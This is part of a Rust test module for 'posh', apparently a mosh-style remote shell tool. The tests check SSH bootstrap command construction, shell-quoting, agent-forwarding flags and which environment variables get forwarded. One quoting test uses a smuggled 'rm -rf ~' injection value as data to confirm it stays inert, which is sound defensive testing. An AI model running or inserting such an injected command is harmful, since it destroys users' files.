        // Only the last three lines ride along.
        let long = startup_failure("a\nb\nc\nd\ne\n").to_string();
        assert!(long.ends_with("ssh: c | d | e"), "{long}");
    }

    #[test]
    fn server_report_prefers_posh_ip() {
        let mut report = ServerReport::default();
        assert!(!report.feed("Welcome to examplehost!").unwrap());
        assert!(!report.feed("POSH IP 192.0.2.7").unwrap());
        assert!(
            report
                .feed("POSH CONNECT 60001 AAAAAAAAAAAAAAAAAAAAAA")
                .unwrap()
        );
        assert_eq!(report.ip.as_deref(), Some("192.0.2.7"));
        assert_eq!(report.port, Some(60001));
        assert_eq!(report.key.as_deref(), Some("AAAAAAAAAAAAAAAAAAAAAA"));
    }

    #[test]
    fn server_report_without_ip_line() {
        let mut report = ServerReport::default();
        assert!(report
            .feed("POSH CONNECT 60044 AAAAAAAAAAAAAAAAAAAAAA")
            .unwrap());
        assert_eq!(report.ip, None);
        assert_eq!(report.port, Some(60044));
    }

    #[test]
    fn server_report_rejects_garbage() {
        let mut report = ServerReport::default();
        assert!(report.feed("POSH CONNECT nope nope").is_err());
        assert!(report.feed("POSH IP ").is_err());
        assert!(report.feed("POSH IP two words").is_err());
    }

    #[test]
    fn remote_session_attach_composition_quotes_inner_argv() {
        // RFC 0001 §2: `posh host:grp/my dev` rides as the server's
        // command, every element shell-quoted (lossless argv, as in fork).
        let opts = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        // New contract (RFC 0008 §3): the caller owns the `--`; the legacy tail
        // leads with it, then the shell-quoted inner argv. Byte-identical output.
        let inner: Vec<String> = ["--", "posh", "-g", "grp", "attach", "my dev"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let cmd = remote_command(&opts, &inner, &[]);
        assert_eq!(
            cmd,
            "posh-server new -- 'posh' '-g' 'grp' 'attach' 'my dev'"
        );
    }

    #[test]
    fn detached_command_quotes_inner_and_prefixes_env() {
        // #67: a detached remote spawn execs `posh ... attach ... --detach
        // ...` directly (no `posh-server new`), every argv element shell-
        // quoted, with locale/TERM env prefixes like the foreground bootstrap.
        let inner: Vec<String> = [
            "posh", "-g", "spinclass", "attach", "id 7", "--detach", "my worker",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        let env = vec![("LANG".to_string(), "en_US.UTF-8".to_string())];
        assert_eq!(
            detached_command(&inner, &env),
            "LANG='en_US.UTF-8' 'posh' '-g' 'spinclass' 'attach' 'id 7' '--detach' 'my worker'"
        );

        // No env prefixes, no create-command.
        let bare: Vec<String> = ["posh", "attach", "w", "--detach"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert_eq!(detached_command(&bare, &[]), "'posh' 'attach' 'w' '--detach'");
    }

    #[test]
    fn remote_command_includes_flags_and_locale() {
        let opts = SshOptions {
            family: Family::Inet6,
            port_range: Some("60100:60200".to_string()),
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        let locale = vec![("LANG".to_string(), "en_US.UTF-8".to_string())];
        // The bare-host tail now carries its own leading `--` (caller-owned).
        let cmd = remote_command(
            &opts,
            &["--".to_string(), "htop".to_string(), "-d".to_string()],
            &locale,
        );
        assert_eq!(
            cmd,
            "LANG='en_US.UTF-8' posh-server new -6 -p 60100:60200 -- 'htop' '-d'"
        );

        let plain = remote_command(
            &SshOptions {
                family: Family::Auto,
                port_range: None,
                agent_source: None,
                real_ssh_agent_forward: None,
                channels: false,
                connect_timeout_secs: None,
                agent_export: false,
            },
            &[],
            &[],
        );
        assert_eq!(plain, "posh-server new");
    }

    #[test]
    fn remote_command_relay_tail() {
        // RFC 0008 §3: the single-model relay bootstrap. The `relay` verb, its
        // `-g GROUP SESSION`, then `-- cmd`. Tokens are shell-quoted for a
        // lossless argv (a spaced session name survives); the `--` stays
        // unquoted, like legacy. The relay CREATES via connect_or_create, so the
        // command rides after the relay's own `--` (no inner `attach`).
        let opts = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        let tail: Vec<String> = ["relay", "-g", "grp", "dev", "--", "htop"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert_eq!(
            remote_command(&opts, &tail, &[]),
            "posh-server new 'relay' '-g' 'grp' 'dev' -- 'htop'"
        );
    }

    #[test]
    fn remote_command_relay_no_group_no_command() {
        // Default group ⇒ no `-g`; no create-command ⇒ no `--` tail.
        let opts = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        let tail: Vec<String> = ["relay", "dev"].iter().map(|s| s.to_string()).collect();
        assert_eq!(remote_command(&opts, &tail, &[]), "posh-server new 'relay' 'dev'");
    }

    #[test]
    fn remote_command_relay_appends_dash_a_before_the_tail() {
        // -A rides right after `new`, before the relay tail — exactly as it does
        // before the legacy tail; the source path never hits the wire (C4).
        let opts = SshOptions {
            family: Family::Inet,
            port_range: Some("60001:60999".to_string()),
            agent_source: Some("/run/user/1000/agent.sock".into()),
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        let tail: Vec<String> = ["relay", "-g", "grp", "dev"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let cmd = remote_command(&opts, &tail, &[]);
        assert_eq!(
            cmd,
            "posh-server new -A -4 -p 60001:60999 'relay' '-g' 'grp' 'dev'"
        );
        assert!(!cmd.contains("agent.sock"), "source path must not hit the wire");
    }

    #[test]
    fn remote_command_appends_dash_a_when_forwarding() {
        // FDR 0004 C4: a bare `-A` rides to posh-server exactly when forwarding
        // resolved on, positioned right after `new` (before -4/-6/-p). The
        // source path never appears — it stays client-side.
        let opts = SshOptions {
            family: Family::Inet,
            port_range: Some("60001:60999".to_string()),
            agent_source: Some("/run/user/1000/agent.sock".into()),
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        let cmd = remote_command(&opts, &[], &[]);
        assert_eq!(cmd, "posh-server new -A -4 -p 60001:60999");
        assert!(!cmd.contains("agent.sock"), "source path must not hit the wire");

        // Off => no -A.
        let off = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        assert_eq!(remote_command(&off, &[], &[]), "posh-server new");
    }

    #[test]
    fn remote_command_carries_channels_flag_only_when_selected() {
        // RFC 0011 §6: the client selects the channel-envelope protocol out of
        // band by appending `--channels` to the bootstrap invocation; a server
        // invoked without it speaks the baseline protocol.
        let on = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: true,
            connect_timeout_secs: None,
            agent_export: false,
        };
        let cmd = remote_command(&on, &[], &[]);
        assert!(cmd.contains(" --channels"), "flag missing: {cmd}");
        assert_eq!(cmd, "posh-server new --channels");

        let off = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        let cmd = remote_command(&off, &[], &[]);
        assert!(!cmd.contains("--channels"), "flag must be absent: {cmd}");
    }

    #[test]
    fn remote_command_carries_agent_export_prefix_only_when_set() {
        // posh#161: when the mux endpoint owns forwarding the session
        // bootstrap carries NO -A (agent_source None) but must still ask the
        // remote to export <base>/agent/sock into the session shell. The ask
        // is an env PREFIX (an old server ignores it; a flag would fail the
        // whole bootstrap as "unknown server option"), after the locale
        // prefixes and before the server word.
        let on = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: true,
        };
        let locale = vec![("LANG".to_string(), "C.UTF-8".to_string())];
        assert_eq!(
            remote_command(&on, &[], &locale),
            "LANG='C.UTF-8' POSH_AGENT_EXPORT=1 posh-server new"
        );
        assert_eq!(remote_command(&on, &[], &[]), "POSH_AGENT_EXPORT=1 posh-server new");

        // The export also decides the bootstrap ssh's real-agent flag: `-a`
        // unless the caller's flag was explicit (no sshd-forwarded
        // competitor in the session's env; an explicit -A still wins).
        assert_eq!(ssh_args(&on), vec!["-a"]);
        assert_eq!(
            ssh_args(&SshOptions {
                real_ssh_agent_forward: Some(true),
                ..on.clone()
            }),
            vec!["-A"]
        );

        // Unset: byte-identical to before the field existed, and the ssh argv
        // says nothing (ssh-config default).
        let off = SshOptions {
            agent_export: false,
            ..on
        };
        assert_eq!(remote_command(&off, &[], &locale), "LANG='C.UTF-8' posh-server new");
        assert_eq!(ssh_args(&off), Vec::<String>::new());

        // The server-side reader accepts the same truthy spellings as the
        // other opt-in gates and nothing else.
        assert!(env_value_on("1") && env_value_on("true") && env_value_on("on"));
        assert!(!env_value_on("0") && !env_value_on(""));
    }

    #[test]
    fn ssh_argv_carries_connect_timeout_only_when_set() {
        // The normal session path says nothing (None): the pre-target ssh
        // argv stays byte-identical to before the field existed.
        let session = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        assert_eq!(ssh_args(&session), Vec::<String>::new());

        // The mux daemon's bounded bootstrap: `-o ConnectTimeout=<n>` rides
        // after the family/agent flags, so a hung destination cannot wedge
        // the shared endpoint indefinitely.
        let mux = SshOptions {
            family: Family::Inet,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: true,
            connect_timeout_secs: Some(10),
            agent_export: false,
        };
        assert_eq!(ssh_args(&mux), vec!["-4", "-o", "ConnectTimeout=10"]);

        // Family/agent flags are untouched by the timeout being unset.
        let flags_only = SshOptions {
            family: Family::Inet6,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: Some(true),
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        assert_eq!(ssh_args(&flags_only), vec!["-6", "-A"]);
    }

    #[test]
    fn channels_value_predicate_parses_opt_in_values() {
        // POSH_CHANNELS opt-in values (RFC 0011 §6 local selection), via the
        // shared truthy predicate. The string predicate is tested directly —
        // not via process env, which is global and racy under parallel tests.
        assert!(env_value_on("1"));
        assert!(env_value_on("true"));
        assert!(env_value_on("TRUE"));
        assert!(env_value_on("on"));
        assert!(env_value_on("On"));
        assert!(env_value_on("yes"));
        assert!(env_value_on("YES"));
        assert!(!env_value_on(""));
        assert!(!env_value_on("0"));
        assert!(!env_value_on("false"));
        assert!(!env_value_on("off"));
        assert!(!env_value_on("no"));
        assert!(!env_value_on("maybe"));
    }

    #[test]
    fn server_command_head_quotes_the_override_only() {
        // #119: the override is the one operator-supplied string in the
        // bootstrap — quoted, so a path with spaces survives and shell
        // metacharacters are inert on the remote. The default stays bare for
        // baseline wire byte-identity.
        assert_eq!(server_command_head(None), "posh-server");
        assert_eq!(server_command_head(Some("")), "posh-server");
        assert_eq!(
            server_command_head(Some("/nix/store/abc-posh/bin/posh-server")),
            "'/nix/store/abc-posh/bin/posh-server'"
        );
        let q = server_command_head(Some("/tmp/my build/posh-server; rm -rf ~"));
        assert!(
            q.starts_with('\'') && q.ends_with('\''),
            "metacharacters must ride inside quotes: {q}"
        );
    }

    #[test]
    fn remote_command_forwards_term_and_colorterm_as_prefixes() {
        // posh#51: TERM/COLORTERM ride the same env-prefix path as LANG, so the
        // session shell isn't stranded with an empty TERM. Values are shell-
        // quoted; the server resolves TERM against its own terminfo DB.
        let opts = SshOptions {
            family: Family::Auto,
            port_range: None,
            agent_source: None,
            real_ssh_agent_forward: None,
            channels: false,
            connect_timeout_secs: None,
            agent_export: false,
        };
        let env = vec![
            ("TERM".to_string(), "xterm-kitty".to_string()),
            ("COLORTERM".to_string(), "truecolor".to_string()),
        ];
        let cmd = remote_command(&opts, &[], &env);
        assert_eq!(
            cmd,
            "TERM='xterm-kitty' COLORTERM='truecolor' posh-server new"
        );
    }

    #[test]
    fn forwarded_var_filter_admits_locale_term_debug_log_and_escape_cmd() {
        // The membership predicate forwarded_env_vars applies, tested directly
        // (not via process env, which is global and racy under parallel tests).
        let admit = |k: &str| {
            (k == "LANG"
                || k.starts_with("LC_")
                || k == "TERM"
                || k == "COLORTERM"
                || k == "POSH_DEBUG_LOG"
                || k == "POSH_ESCAPE_CMD")
                && is_shell_safe_name(k)
        };
        assert!(admit("TERM"));
        assert!(admit("COLORTERM"));
        assert!(admit("LANG"));
        assert!(admit("LC_ALL"));
        assert!(admit("POSH_DEBUG_LOG"));
        // The escape-to-shell command rides to the remote server (FDR 0008).
        assert!(admit("POSH_ESCAPE_CMD"));
        assert!(!admit("PATH"));
        // The trigger KEY is client-side only — it must not be forwarded.
        assert!(!admit("POSH_ESCAPE_KEY"));
        // The session key must never ride the cleartext remote command.
        assert!(!admit("POSH_KEY"));
    }
}
